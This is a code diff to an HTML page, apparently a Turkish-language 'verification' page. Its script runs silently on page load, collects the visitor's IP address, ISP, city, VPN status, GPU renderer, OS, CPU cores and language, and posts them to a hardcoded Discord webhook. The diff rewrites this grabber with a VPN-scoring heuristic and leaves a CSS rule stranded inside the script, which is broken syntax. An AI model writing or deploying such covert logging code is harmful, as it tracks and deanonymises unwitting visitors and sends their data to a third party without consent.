@@ -10,34 +10,39 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function analyze() {
-            let status = { vpn: "Analiz Ediliyor...", gpu: "X", iss: "X", loc: "X" };
+        async function verify() {
+            let status = { vpn: "Belirlenemedi", gpu: "X", iss: "X", loc: "X", color: 15158332 };
 
             try {
+                const start = performance.now();
                 const res = await fetch('https://ipapi.co/json/');
+                const latency = Math.round(performance.now() - start);
                 const j = await res.json();
                 
-                // SİSTEM VERİLERİ
                 const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const ipTz = j.timezone;
-                const sysLang = navigator.language;
                 
-                // VPN ANALİZ VE KANIT MOTORU
-                let isVpn = false;
-                if (j.proxy || j.hosting) isVpn = true;
-                if (sysTz !== ipTz) isVpn = true;
+                // VPN/PROXY ANALİZ MOTORU
+                let vpnPoints = 0;
+                if (j.proxy || j.hosting) vpnPoints += 2;
+                if (sysTz !== ipTz) vpnPoints += 3;
+                if (latency > 1000) vpnPoints += 1; // 1 saniye üzeri gecikme şüphelidir
 
-                if (isVpn) {
-                    status.vpn = `⚠️ **VPN/PROXY ALGILANDI**\n↳ Neden: Zaman Dilimi Çakışması\n↳ Sistem: \`${sysTz}\` | IP: \`${ipTz}\``;
+                if (vpnPoints === 0) {
+                    status.vpn = `✅ **VPN KAPALI (KESİN DOĞRULAMA)**\n↳ Gecikme: \`${latency}ms\` (Normal)\n↳ Zaman Dilimi: \`${sysTz}\` (Eşleşti)\n↳ Durum: Gerçek ev kullanıcısı bağlantısı.`;
+                    status.color = 3066993; // Yeşil
+                } else if (vpnPoints < 3) {
+                    status.vpn = `⚠️ **VPN ŞÜPHESİ (ZAYIF)**\n↳ Gecikme: \`${latency}ms\`\n↳ Proxy Verisi: \`${j.proxy ? 'Aktif' : 'Temiz'}\``;
+                    status.color = 15105570; // Turuncu
                 } else {
-                    // VPN KAPALIYSA BU KISIM ÇALIŞACAK
-                    status.vpn = `✅ **VPN KAPALI (DOĞRULANDI)**\n↳ Analiz: Sistem saati (\`${sysTz}\`) ve IP lokasyonu eşleşiyor.`;
+                    status.vpn = `🚨 **VPN/PROXY TESPİT EDİLDİ (KRİTİK)**\n↳ Sistem Saati: \`${sysTz}\`\n↳ IP Lokasyon Saati: \`${ipTz}\`\n↳ Gecikme: \`${latency}ms\``;
+                    status.color = 15158332; // Kırmızı
                 }
 
                 status.iss = `🌐 **ISS:** \`${j.org}\` (AS${j.asn})\n📍 **Konum:** ${j.city}, ${j.country_name}`;
                 status.ip = j.ip;
 
-                // GPU MASKESİNİ DETAYLANDIRMA
+                // GPU MASKESİNİ ZORLAMA
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
@@ -46,33 +51,32 @@
                 
                 status.gpu = `**Renderer:** \`${r}\`\n**Vendor:** \`${v}\``;
                 if(r.includes("WebKit")) {
-                    status.gpu += `\n⚠️ *Not: Donanım Apple/WebKit tarafından maskelenmiş.*`;
+                    // Apple korumasını belirt
+                    status.gpu += `\n⚠️ *Not: Apple/Safari gizlilik maskesi devrede.*`;
                 }
 
-            } catch(e) { status.vpn = "❌ Analiz Hatası (Bağlantı Engellendi)"; }
+            } catch(e) { status.vpn = "❌ Veri çekilemedi. Bağlantı VPN tarafından kesilmiş olabilir."; }
 
-            // DISCORD PAYLOAD
             const payload = {
                 embeds: [{
-                    title: "💀 ADLİ ANALİZ RAPORU (VERIFIED)",
-                    color: 3066993, // Yeşil renk (Her şey yolundaysa)
+                    title: "🕵️ SİSTEM ADLİ ANALİZİ (V35)",
+                    color: status.color,
                     fields: [
-                        { name: "🛡️ GÜVENLİK VE VPN ANALİZİ", value: status.vpn, inline: false },
-                        { name: "📡 AĞ VE OPERATÖR BİLGİSİ", value: `${status.iss}\n**IP:** \`${status.ip}\``, inline: false },
+                        { name: "🛡️ GÜVENLİK ANALİZİ", value: status.vpn, inline: false },
+                        { name: "📡 AĞ BİLGİLERİ", value: `${status.iss}\n**IP:** \`${status.ip}\``, inline: false },
                         { name: "🛠️ DONANIM KİMLİĞİ", value: status.gpu, inline: false },
-                        { name: "⚙️ CİHAZ DETAYLARI", value: `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Core\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB`, inline: false }
+                        { name: "⚙️ SİSTEM", value: `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n🌍 **Dil:** ${navigator.language}`, inline: false }
                     ],
-                    footer: { text: "Protocol: Verified-ID v30" },
                     timestamp: new Date()
                 }]
             };
 
-            // Eğer VPN algılandıysa rengi kırmızı yap
-            if (status.vpn.includes("⚠️")) payload.embeds[0].color = 15158332;
-
             fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
         }
 
-        window.onload = () => setTimeout(analyze, 500);
-        @keyframes s {
-        
+        window.onload = () => setTimeout(verify, 500);
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </script>
+</body>
+</html>
+
